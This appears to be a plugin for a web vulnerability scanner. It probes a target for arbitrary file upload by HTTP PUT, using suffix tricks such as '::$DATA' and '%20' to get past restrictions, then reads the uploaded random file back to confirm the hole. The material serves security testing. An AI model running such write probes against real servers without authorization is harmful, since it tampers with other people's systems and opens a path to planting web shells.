#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from lib.util.util import random_lowercase_digits
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

        self.suffix_list = [
            '',
            '/',
            '::$DATA',
            '%20'
        ]

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    for suffix in self.suffix_list:
                        keyword = random_lowercase_digits(16)
                        file = random_lowercase_digits(16)
                        url = path + file + '.txt' + suffix
                        try:
                            async with session.put(url=url, data=keyword) as res1:
                                if res1:
                                    if res1.status == 200 or res1.status == 201 or res1.status == 204:
                                        url2 = path + file + '.txt'
                                        async with session.get(url=url2) as res2:
                                            if res2:
                                                text2 = await res2.text()
                                                if keyword in text2:
                                                    yield url
                        except:
                            pass